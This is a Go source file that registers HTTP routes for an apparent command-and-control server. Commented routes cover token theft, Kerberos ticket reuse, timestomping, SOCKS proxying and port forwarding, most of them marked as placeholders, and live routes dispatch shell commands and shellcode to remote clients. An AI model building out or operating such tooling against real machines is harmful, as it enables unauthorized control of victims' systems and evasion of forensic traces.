package handlers

import (
	"encoding/json"
	"github.com/Connduit/frazzledrip/server/backend/network"
	"github.com/Connduit/frazzledrip/server/backend/utils"
	"net/http"
)

// RegisterHandlers connects frontend API routes to their backend handlers.
func RegisterHandlers() {

	// Intended purpose: Capture an image of the client desktop.
	// Placeholder for SCREENSHOT: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/screenshot", screenshotHandler)

	// Intended purpose: Change the client working directory for later relative paths.
	// Placeholder for CD: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/cd", cdHandler)

	// Intended purpose: Copy a file or directory to another client-side path.
	// Placeholder for CP: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/cp", cpHandler)

	// Intended purpose: List the drives and mounted volumes visible to the client.
	// Placeholder for DRIVES: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/drives", drivesHandler)

	// Intended purpose: Stop the client and close its session.
	// Placeholder for EXIT: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/exit", exitHandler)

	// Intended purpose: Inspect privileges available to the current security context.
	// Placeholder for GETPRIVS: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/getprivs", getprivsHandler)

	// Intended purpose: Report the user identity under which the client is running.
	// Placeholder for GETUID: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/getuid", getuidHandler)

	// Intended purpose: Use a supplied Kerberos credential cache for authentication.
	// Placeholder for KERBEROS_CCACHE_USE: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/kerberos-ccache-use", kerberosCcacheUseHandler)

	// Intended purpose: Remove Kerberos tickets from the selected logon context.
	// Placeholder for KERBEROS_TICKET_PURGE: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/kerberos-ticket-purge", kerberosTicketPurgeHandler)

	// Intended purpose: Use a supplied Kerberos ticket for authentication.
	// Placeholder for KERBEROS_TICKET_USE: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/kerberos-ticket-use", kerberosTicketUseHandler)

	// Intended purpose: Stop a background job tracked by the client.
	// Placeholder for JOBKILL: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/jobkill", jobkillHandler)

	// Intended purpose: Terminate a selected process on the client.
	// Placeholder for KILL: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/kill", killHandler)

	// Intended purpose: Associate another client session with the selected session.
	// Placeholder for LINK: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/link", linkHandler)

	// Intended purpose: List the files and directories at a client-side path.
	// Placeholder for LS: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/ls", lsHandler)

	// Intended purpose: Create a security context from supplied logon credentials.
	// Placeholder for MAKE_TOKEN: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/make-token", makeTokenHandler)

	// Intended purpose: Create a directory on the client.
	// Placeholder for MKDIR: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/mkdir", mkdirHandler)

	// Intended purpose: Move or rename a file or directory on the client.
	// Placeholder for MV: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/mv", mvHandler)

	// Intended purpose: Select a parent process ID for future process launches.
	// Placeholder for PPID: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/ppid", ppidHandler)

	// Intended purpose: List processes running on the client.
	// Placeholder for PS: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/ps", psHandler)

	// Intended purpose: Report the client working directory.
	// Placeholder for PWD: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/pwd", pwdHandler)

	// Intended purpose: List the subkeys and values of a Windows registry key.
	// Placeholder for REG_QUERY: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/reg-query", regQueryHandler)

	// Intended purpose: Read a specified value from a Windows registry key.
	// Placeholder for REG_QUERYV: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/reg-queryv", regQueryvHandler)

	// Intended purpose: Restore the original client security context after impersonation.
	// Placeholder for REV2SELF: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/rev2self", rev2selfHandler)

	// Intended purpose: Remove a file or directory from the client.
	// Placeholder for RM: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/rm", rmHandler)

	// Intended purpose: Forward connections from a client-side port to another endpoint.
	// Placeholder for RPORTFWD: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/rportfwd", rportfwdHandler)

	// Intended purpose: Set an environment variable for the client execution context.
	// Placeholder for SETENV: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/setenv", setenvHandler)

	// Intended purpose: Provide a SOCKS proxy through the selected client session.
	// Placeholder for SOCKS: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/socks", socksHandler)

	// Intended purpose: Adopt another process security token for impersonation.
	// Placeholder for STEAL_TOKEN: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/steal-token", stealTokenHandler)

	// Intended purpose: Change the filesystem timestamps associated with a file.
	// Placeholder for TIMESTOMP: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/timestomp", timestompHandler)

	// Intended purpose: Remove the association between linked client sessions.
	// Placeholder for UNLINK: return HTTP 501 without contacting a client.
	http.HandleFunc("/commands/unlink", unlinkHandler)

	// List the non-executable attack and script placeholders available in the tools catalog.
	http.HandleFunc("/tool-catalog", toolCatalogHandler)

	// Record a simulated tool task and test result without contacting a client.
	http.HandleFunc("/simulate-tool", simulateToolHandler)

	// Retrieve saved task summaries or the details and output of one task.
	http.HandleFunc("/task-history", taskHistoryHandler)

	// Retrieve recent server audit events for the Event Viewer and audit history.
	http.HandleFunc("/audit-history", auditHistoryHandler)

	// Read cached directory listings or request a new listing from the selected client.
	http.HandleFunc("/browse-files", browseFilesHandler)

	// Request that the selected client upload a file to the server; acknowledge dispatch.
	http.HandleFunc("/download-file", downloadFilePlaceholderHandler)

	// Explicitly associate a live connection with a previously saved session.
	http.HandleFunc("/link-session", linkSessionHandler)

	// Stop accepting new TCP connections while preserving existing sessions.
	http.HandleFunc("/stop-listener", stopListenerHandler)

	// Report TCP listener status, bind address, and bound port.
	http.HandleFunc("/listener-status", listenerStatusHandler)

	// Close a selected session's connection while retaining its saved information.
	http.HandleFunc("/disconnect-session", disconnectSessionHandler)

	// Start the default TCP listener and report any bind failure.
	http.HandleFunc("/start-listener", startListenerHandler)

	// List snapshots of active and saved offline client sessions.
	http.HandleFunc("/get-clients", getClientsHandler)

	// Retrieve the selected client's recent incoming messages and session metadata.
	http.HandleFunc("/get-client-messages", getClientMessagesHandler)

	// Dispatch a shell command through the client's EXECUTE_COMMAND message handler.
	http.HandleFunc("/send-command", sendCommandHandler)

	// Request native host information through the existing SYS_INFO message handler.
	http.HandleFunc("/my-send-command", mySendCommandHandler)

	// Accept a file from the browser and send it to the selected client.
	http.HandleFunc("/send-binary", sendBinaryHandler)

	// Accept shellcode from the browser and dispatch it to the client's shellcode handler.
	http.HandleFunc("/send-shellcode", sendShellcodeHandler)

	// Retrieve the selected client's collected system information.
	http.HandleFunc("/get-client-info", getClientInfoHandler)
}

func getClientsHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	clients := network.GetAllClients()
	json.NewEncoder(w).Encode(clients)
}
